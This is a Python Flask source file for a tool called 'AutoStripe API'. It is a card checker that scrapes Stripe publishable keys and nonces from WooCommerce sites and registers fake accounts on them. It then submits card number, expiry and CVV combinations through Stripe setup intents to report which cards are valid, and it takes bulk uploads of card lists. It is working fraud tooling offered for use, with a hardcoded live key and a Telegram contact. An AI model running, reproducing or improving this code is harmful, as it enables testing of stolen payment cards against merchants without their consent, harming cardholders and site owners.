from flask import Flask, jsonify, render_template_string, request, send_file
import requests
from fake_useragent import UserAgent
import uuid
import time
import re
import random
import string
import os
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Configure upload folder for text files
UPLOAD_FOLDER = 'uploads'
RESULTS_FOLDER = 'results'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(RESULTS_FOLDER, exist_ok=True)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['RESULTS_FOLDER'] = RESULTS_FOLDER

def get_stripe_key(domain):
    urls_to_try = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        f"https://{domain}/?wc-ajax=get_stripe_params"
    ]
    
    patterns = [
        r'pk_live_[a-zA-Z0-9_]+',
        r'stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'wc_stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'"publishableKey":"(pk_live_[^"]+)"',
        r'var stripe = Stripe[\'"]((pk_live_[^\'"]+))[\'"]'
    ]
    
    for url in urls_to_try:
        try:
            response = requests.get(url, headers={'User-Agent': UserAgent().random}, timeout=10)
            if response.status_code == 200:
                for pattern in patterns:
                    match = re.search(pattern, response.text)
                    if match:                
                        key_match = re.search(r'pk_live_[a-zA-Z0-9_]+', match.group(0))
                        if key_match:
                            return key_match.group(0)
        except:
            continue
    
    return "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"

def extract_nonce_from_page(html_content, domain):
    patterns = [
        r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
        r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
        r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'var wc_stripe_params = [^}]*"nonce":"([^"]+)"',
        r'var stripe_params = [^}]*"nonce":"([^"]+)"',
        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            return match.group(1)
    
    return None

def generate_random_credentials():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f"{username}@gmail.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return username, email, password

def register_account(domain, session):
    try:        
        reg_response = session.get(f"https://{domain}/my-account/")
                
        reg_nonce_patterns = [
            r'name="woocommerce-register-nonce" value="([^"]+)"',
            r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
            r'register-nonce["\']?:\s*["\']([^"\']+)["\']'
        ]
        
        reg_nonce = None
        for pattern in reg_nonce_patterns:
            match = re.search(pattern, reg_response.text)
            if match:
                reg_nonce = match.group(1)
                break
        
        if not reg_nonce:
            return False, "Could not extract registration nonce"
                
        username, email, password = generate_random_credentials()
        
        reg_data = {
            'username': username,
            'email': email,
            'password': password,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }
        
        reg_result = session.post(
            f"https://{domain}/my-account/",
            data=reg_data,
            headers={'Referer': f'https://{domain}/my-account/'}
        )
        
        if 'Log out' in reg_result.text or 'My Account' in reg_result.text:
            return True, "Registration successful"
        else:
            return False, "Registration failed"
            
    except Exception as e:
        return False, f"Registration error: {str(e)}"

def process_card_enhanced(domain, ccx, mode="stable"):
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return {
            "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
            "status": "Declined"
        }
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user_agent = UserAgent().random
    stripe_mid = str(uuid.uuid4())
    stripe_sid = str(uuid.uuid4()) + str(int(time.time()))

    session = requests.Session()
    session.headers.update({'User-Agent': user_agent})

    stripe_key = get_stripe_key(domain)

    # Only register if mode is stable
    if mode == "stable":
        registered, reg_message = register_account(domain, session)
        
    payment_urls = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/my-account/"
    ]
    
    nonce = None
    for url in payment_urls:
        try:
            response = session.get(url, timeout=10)
            if response.status_code == 200:
                nonce = extract_nonce_from_page(response.text, domain)
                if nonce:
                    break
        except:
            continue
    
    if not nonce:
        return {"response": "Failed to extract nonce from site", "status": "Declined"}

    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'US',
        'billing_details[address][postal_code]': '10080',
        'billing_details[name]': 'Sahil Pro',
        'pasted_fields': 'number',
        'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3/{uuid.uuid4().hex[:8]}; payment-element; deferred-intent',
        'referrer': f'https://{domain}',
        'time_on_page': str(int(time.time()) % 100000),
        'key': stripe_key,
        '_stripe_version': '2024-06-20',
        'guid': str(uuid.uuid4()),
        'muid': stripe_mid,
        'sid': stripe_sid
    }

    try:
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers={
                'User-Agent': user_agent,
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            },
            timeout=15
        )
        pm_data = pm_response.json()

        if 'id' not in pm_data:
            error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
            return {"response": error_msg, "status": "Declined"}

        payment_method_id = pm_data['id']
    except Exception as e:
        return {"response": f"Payment Method Creation Failed: {str(e)}", "status": "Declined"}
    
    endpoints = [
        {'url': f'https://{domain}/', 'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}},
        {'url': f'https://{domain}/wp-admin/admin-ajax.php', 'params': {}},
        {'url': f'https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', 'params': {}}
    ]
    
    data_payloads = [
        {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        },
        {
            'action': 'wc_stripe_create_setup_intent',
            'payment_method_id': payment_method_id,
            '_wpnonce': nonce,
        }
    ]

    for endpoint in endpoints:
        for data_payload in data_payloads:
            try:
                setup_response = session.post(
                    endpoint['url'],
                    params=endpoint.get('params', {}),
                    headers={
                        'User-Agent': user_agent,
                        'Referer': f'https://{domain}/my-account/add-payment-method/',
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'origin': f'https://{domain}',
                        'x-requested-with': 'XMLHttpRequest',
                    },
                    data=data_payload,
                    timeout=15
                )
                                
                try:
                    setup_data = setup_response.json()
                except:
                    setup_data = {'raw_response': setup_response.text}
              
                if setup_data.get('success', False):
                    data_status = setup_data['data'].get('status')
                    if data_status == 'requires_action':
                        return {"response": "3D", "status": "Declined"}
                    elif data_status == 'succeeded':
                        return {"response": "Card Added ", "status": "Approved"}
                    elif 'error' in setup_data['data']:
                        error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                        return {"response": error_msg, "status": "Declined"}

                if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    return {"response": error_msg, "status": "Declined"}

                if setup_data.get('status') in ['succeeded', 'success']:
                    return {"response": "Card Added", "status": "Approved"}

            except Exception as e:
                continue

    return {"response": "All payment attempts failed", "status": "Declined"}

@app.route('/')
def home():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>AutoStripe API</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --primary-color: #6f42c1;
                --secondary-color: #8e5dc4;
                --glass-bg: rgba(255, 255, 255, 0.1);
                --glass-border: rgba(255, 255, 255, 0.2);
            }
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                position: relative;
                overflow-x: hidden;
            }
            
            /* Animated background elements */
            .bg-bubble {
                position: fixed;
                border-radius: 50%;
                background: rgba(255, 255, 255, 0.1);
                animation: float 20s infinite ease-in-out;
                z-index: -1;
            }
            
            .bubble-1 {
                width: 80px;
                height: 80px;
                left: 10%;
                top: 20%;
                animation-delay: 0s;
            }
            
            .bubble-2 {
                width: 120px;
                height: 120px;
                right: 20%;
                top: 30%;
                animation-delay: 2s;
            }
            
            .bubble-3 {
                width: 60px;
                height: 60px;
                left: 30%;
                bottom: 20%;
                animation-delay: 4s;
            }
            
            .bubble-4 {
                width: 100px;
                height: 100px;
                right: 10%;
                bottom: 10%;
                animation-delay: 6s;
            }
            
            @keyframes float {
                0%, 100% {
                    transform: translateY(0) rotate(0deg);
                }
                50% {
                    transform: translateY(-20px) rotate(10deg);
                }
            }
            
            .main-container {
                text-align: center;
                animation: fadeIn 1s ease-out;
            }
            
            .logo {
                width: 120px;
                height: 120px;
                background: var(--glass-bg);
                backdrop-filter: blur(10px);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 30px;
                border: 1px solid var(--glass-border);
                box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
                animation: pulse 2s infinite;
            }
            
            @keyframes pulse {
                0% {
                    box-shadow: 0 0 0 0 rgba(111, 66, 193, 0.7);
                }
                70% {
                    box-shadow: 0 0 0 10px rgba(111, 66, 193, 0);
                }
                100% {
                    box-shadow: 0 0 0 0 rgba(111, 66, 193, 0);
                }
            }
            
            .logo i {
                font-size: 60px;
                color: white;
            }
            
            h1 {
                color: white;
                font-weight: 700;
                margin-bottom: 10px;
                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
            }
            
            .subtitle {
                color: rgba(255, 255, 255, 0.8);
                font-size: 20px;
                margin-bottom: 40px;
            }
            
            .docs-link {
                display: inline-flex;
                align-items: center;
                gap: 10px;
                background: var(--glass-bg);
                backdrop-filter: blur(10px);
                border: 1px solid var(--glass-border);
                border-radius: 15px;
                padding: 15px 30px;
                color: white;
                text-decoration: none;
                font-size: 18px;
                font-weight: 600;
                transition: all 0.3s ease;
                margin-bottom: 40px;
            }
            
            .docs-link:hover {
                background: rgba(255, 255, 255, 0.2);
                transform: translateY(-3px);
                color: white;
            }
            
            .footer {
                position: absolute;
                bottom: 30px;
                color: rgba(255, 255, 255, 0.7);
                font-size: 16px;
            }
            
            .footer a {
                color: white;
                text-decoration: none;
                font-weight: 600;
                transition: color 0.3s ease;
            }
            
            .footer a:hover {
                color: var(--primary-color);
            }
            
            /* Documentation Modal */
            .modal {
                display: none;
                position: fixed;
                z-index: 1000;
                left: 0;
                top: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0, 0, 0, 0.5);
                backdrop-filter: blur(5px);
                animation: fadeIn 0.3s ease-out;
            }
            
            .modal-content {
                background: var(--glass-bg);
                backdrop-filter: blur(10px);
                border: 1px solid var(--glass-border);
                margin: 5% auto;
                padding: 0;
                border-radius: 15px;
                width: 80%;
                max-width: 800px;
                box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
                animation: slideIn 0.3s ease-out;
            }
            
            .modal-header {
                background: rgba(111, 66, 193, 0.3);
                color: white;
                padding: 20px;
                border-radius: 15px 15px 0 0;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            
            .modal-body {
                padding: 30px;
                color: white;
            }
            
            .close {
                color: white;
                font-size: 28px;
                font-weight: bold;
                cursor: pointer;
                transition: color 0.3s ease;
            }
            
            .close:hover {
                color: #ccc;
            }
            
            .modal-body h6 {
                color: var(--primary-color);
                margin-top: 20px;
                margin-bottom: 10px;
            }
            
            .modal-body h6:first-child {
                margin-top: 0;
            }
            
            .modal-body code {
                background: rgba(255, 255, 255, 0.1);
                padding: 5px 10px;
                border-radius: 5px;
                font-family: monospace;
            }
            
            .modal-body pre {
                background: rgba(0, 0, 0, 0.2);
                padding: 15px;
                border-radius: 10px;
                overflow-x: auto;
                margin-top: 10px;
            }
            
            .modal-body ul {
                margin-left: 20px;
                margin-top: 10px;
            }
            
            .modal-body li {
                margin-bottom: 5px;
            }
            
            /* Animations */
            @keyframes fadeIn {
                from {
                    opacity: 0;
                }
                to {
                    opacity: 1;
                }
            }
            
            @keyframes slideIn {
                from {
                    transform: translateY(-50px);
                    opacity: 0;
                }
                to {
                    transform: translateY(0);
                    opacity: 1;
                }
            }
            
            /* Responsive adjustments */
            @media (max-width: 768px) {
                .modal-content {
                    width: 95%;
                    margin: 10% auto;
                }
                
                .modal-body {
                    padding: 20px;
                }
                
                .logo {
                    width: 100px;
                    height: 100px;
                }
                
                .logo i {
                    font-size: 50px;
                }
            }
        </style>
    </head>
    <body>
        <!-- Animated background elements -->
        <div class="bg-bubble bubble-1"></div>
        <div class="bg-bubble bubble-2"></div>
        <div class="bg-bubble bubble-3"></div>
        <div class="bg-bubble bubble-4"></div>
        
        <div class="main-container">
            <div class="logo">
                <i class="fas fa-credit-card"></i>
            </div>
            <h1>AutoStripe API</h1>
            <p class="subtitle">Professional Stripe Payment Processing</p>
            <a href="#" class="docs-link" onclick="showDocs(); return false;">
                <i class="fas fa-book"></i> Documentation
            </a>
        </div>
        
        <div class="footer">
            <p>Developed by Taisirshaik | TG: <a href="https://t.me/aiojames" target="_blank">@aiojames</a></p>
        </div>
        
        <!-- Documentation Modal -->
        <div id="docsModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2><i class="fas fa-book me-2"></i> AutoStripe API Documentation</h2>
                    <span class="close" onclick="closeDocs()">&times;</span>
                </div>
                <div class="modal-body">
                    <h6>API Endpoint</h6>
                    <p><code>/process?key=inferno&mode=fast&site=example.com&cc=card_number|mm|yy|cvv</code></p>
                    
                    <h6>Parameters</h6>
                    <ul>
                        <li><strong>key</strong>: API key (required) - Use "inferno"</li>
                        <li><strong>mode</strong>: Processing mode (optional) - "stable" or "fast" (default: "stable")</li>
                        <li><strong>site</strong>: Target website (required) - e.g., "example.com"</li>
                        <li><strong>cc</strong>: Card details (required) - Format: "card_number|mm|yy|cvv"</li>
                    </ul>
                    
                    <h6>Modes</h6>
                    <ul>
                        <li><strong>Stable</strong>: Includes login process for more reliable processing</li>
                        <li><strong>Fast</strong>: Skips login process for quicker processing</li>
                    </ul>
                    
                    <h6>Response Format</h6>
                    <p>The API returns a JSON object with the following structure:</p>
                    <pre><code>{
  "response": "Card Added",
  "status": "Approved"
}</code></pre>
                    
                    <h6>Example Usage</h6>
                    <p>Single card processing:</p>
                    <pre><code>GET /process?key=inferno&mode=stable&site=example.com&cc=4242424242424242|12|25|123</code></pre>
                    
                    <p>Fast mode processing:</p>
                    <pre><code>GET /process?key=inferno&mode=fast&site=example.com&cc=4242424242424242|12|25|123</code></pre>
                </div>
            </div>
        </div>
        
        <script>
            function showDocs() {
                document.getElementById('docsModal').style.display = 'block';
            }
            
            function closeDocs() {
                document.getElementById('docsModal').style.display = 'none';
            }
            
            // Close modal when clicking outside of it
            window.onclick = function(event) {
                const modal = document.getElementById('docsModal');
                if (event.target == modal) {
                    modal.style.display = 'none';
                }
            }
        </script>
    </body>
    </html>
    """)

@app.route('/process')
def process_request():
    key = request.args.get('key')
    domain = request.args.get('site')
    cc = request.args.get('cc')
    mode = request.args.get('mode', 'stable')  # Default to stable mode
    
    if key != "inferno":
        return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
    
    if not domain or not re.match(r'^[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,6}$', domain):
        return jsonify({"error": "Invalid domain format", "status": "Bad Request"}), 400
        
    if not cc or not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
        return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV", "status": "Bad Request"}), 400
    
    if mode not in ["stable", "fast"]:
        return jsonify({"error": "Invalid mode. Use: stable or fast", "status": "Bad Request"}), 400
    
    result = process_card_enhanced(domain, cc, mode)
        
    return jsonify({
        "response": result["response"],
        "status": result["status"]
    })

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400
    
    if file and file.filename.endswith('.txt'):
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        # Process the file
        with open(filepath, 'r') as f:
            lines = f.readlines()
        
        results = []
        for line in lines:
            line = line.strip()
            if line:
                parts = line.split('|')
                if len(parts) >= 4:
                    cc = '|'.join(parts[:4])
                    domain = parts[4] if len(parts) > 4 else "example.com"
                    mode = parts[5] if len(parts) > 5 else "stable"
                    
                    result = process_card_enhanced(domain, cc, mode)
                    results.append({
                        "Card": cc,
                        "Domain": domain,
                        "Mode": mode,
                        "Response": result["response"],
                        "Status": result["status"]
                    })
        
        # Save results to a new file
        result_filename = f"results_{int(time.time())}.txt"
        result_filepath = os.path.join(app.config['RESULTS_FOLDER'], result_filename)
        
        with open(result_filepath, 'w') as f:
            for result in results:
                f.write(f"{result['Card']}|{result['Domain']}|{result['Mode']}|{result['Response']}|{result['Status']}\n")
        
        return jsonify({
            "message": "File processed successfully",
            "results_count": len(results),
            "download_url": f"/download/{result_filename}"
        })
    
    return jsonify({"error": "Invalid file format. Please upload a .txt file"}), 400

@app.route('/download/<filename>')
def download_file(filename):
    filepath = os.path.join(app.config['RESULTS_FOLDER'], filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return jsonify({"error": "File not found"}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)
